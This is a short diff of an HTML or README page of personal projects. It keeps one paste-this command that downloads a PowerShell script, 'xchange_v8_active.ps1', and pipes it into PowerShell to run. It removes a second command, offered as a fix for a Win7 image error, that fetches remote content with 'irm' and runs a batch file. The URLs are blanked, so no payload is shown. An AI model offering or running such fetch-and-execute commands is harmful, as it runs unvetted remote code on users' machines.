@@ -480,10 +480,6 @@ This section contains fun projects created through my exploration, combining var
 <pre><code>curl # -Outfile xchange_v8_active.ps1 | powershell -c xchange_v8_active.ps1
 </code></pre>
 
-<p>Win7 "Insufficient Memory" error when opening images <a href="#">Image & Text Version</a></p>
-
-<pre><code>powershell -c "irm  #" && exifhelper.bat
-</code></pre>
 
 </details>
 
